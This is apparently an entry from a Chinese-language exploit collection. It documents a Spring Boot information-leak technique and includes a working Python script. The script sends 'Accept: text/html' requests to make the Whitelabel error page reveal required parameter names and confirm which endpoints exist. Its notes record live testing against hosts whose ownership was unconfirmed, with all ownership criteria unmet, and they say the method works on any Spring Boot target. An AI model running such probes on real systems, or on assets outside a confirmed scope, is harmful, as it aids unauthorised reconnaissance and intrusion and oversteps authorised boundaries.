# Spring Boot Whitelabel Error Page 参数名 oracle（Accept: text/html 读出必需 @RequestParam 名）

- **code**: spring-boot-whitelabel-error-page-参数名-oracle-accept-text-html-读出必需-requestparam
- **kind**: script
- **category**: info-leak
- **component**: Spring Boot (Whitelabel Error Page)
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 http://203.0.113.123:8081 与 http://203.0.113.120:8081 实测：GET /data/api/confirmRelation + Accept: text/html → 400 + Whitelabel 页 + "Required String parameter 'data' is not present"，据此首次拿到该接口的真实参数名 `data`（此前 30+ 候选参数名全部漏掉它）；GET /data/api/getAccount、/data/api/getData → 同法读出参数名 `code`；GET /client/auth/login、/client/api/openAccount 等 → 405 确认映射存在且只收 POST。对照：不带 text/html 时全部只返回 {"code":0,"msg":"ERROR"}，参数名不可见。
- **path**: pocs/spring-boot-whitelabel-error-page-参数名-oracle-accept-text-html-读出必需-requestparam/spring_param_oracle.py
- **tags**: spring,java,参数名泄露,信息泄露,接口枚举,oracle
- **created_at**: 2026-09-28T10:32:44.266Z
- **found_by**: exploit

## 描述

用 Accept: text/html 触发 Spring Whitelabel Error Page，从 "Required String parameter 'X' is not present" 回显中精确读出接口的必需参数名，并可判定接口/方法是否存在——对业务层吞掉异常信息的接口同样有效。**验证过程发生在一个归属待审资产（203.0.113.123/.225:8081，C 段扫描发现、四条归属硬判据均不满足）上；方法本身是通用的 Spring 手法，与归属无关，可用在任何 Spring Boot 目标（含已确认属于目标的 A 类资产）。**

## 用法

```
python spring_param_oracle.py http://203.0.113.123:8081 /data/api/confirmRelation
把 Accept 设为 text/html 是关键：Content-Length/JSON 分支被自定义异常处理器接管，只有 HTML 分支会落到容器默认错误页并回显 Spring 的参数绑定异常消息。
批量枚举时对每个候选路径发 GET+POST 各一次，响应不是应用自身兜底（本靶标为 {"code":4,"msg":"INTERFACE ERROR"}）即说明映射存在。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Boot 参数名 oracle：Accept: text/html 触发 Whitelabel Error Page，
该页在只启用 @RequestParam 的接口上会回显 Required String parameter 'X' is not present ——
即使业务异常处理器把 JSON 错误信息吞成 {"code":0,"msg":"ERROR"} 也照样泄露真实参数名。
同时可判定接口是否存在（未命中映射时返回应用自己的全局兜底响应）。

用法：
  python spring_param_oracle.py <base_url> <path>
例：
  python spring_param_oracle.py http://target:8081 /data/api/confirmRelation
"""
import re, sys, requests
requests.packages.urllib3.disable_warnings()

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8081"
PATH = sys.argv[2] if len(sys.argv) > 2 else "/data/api/confirmRelation"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"

s = requests.Session(); s.trust_env = False
# 若需走代理：s.proxies = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}

for method in ("GET", "POST"):
    try:
        r = s.request(method, BASE + PATH, headers={"User-Agent": UA, "Accept": "text/html"},
                      timeout=12, verify=False, allow_redirects=False)
    except Exception as e:
        print("%-4s ERR %s" % (method, e)); continue
    body = r.content.decode("utf-8", "replace")
    print("%-4s %s len=%d" % (method, r.status_code, len(r.content)))
    # 判据 1：Whitelabel Error Page 里回显的缺失参数名
    for pat in (r"parameter &#39;([^&]+)&#39; is not present",
                r"parameter '([^']+)' is not present"):
        m = re.search(pat, body)
        if m:
            print("   >>> 必需参数名 = %s" % m.group(1))
            break
    # 判据 2：405 说明映射存在但方法不对；405 页同样带 Whitelabel
    if r.status_code == 405:
        print("   >>> 映射存在，该路径只接受其它 HTTP 方法（多为 POST）")
    if "Whitelabel Error Page" not in body:
        print("   body: %s" % body[:200].replace("\n", " "))

```
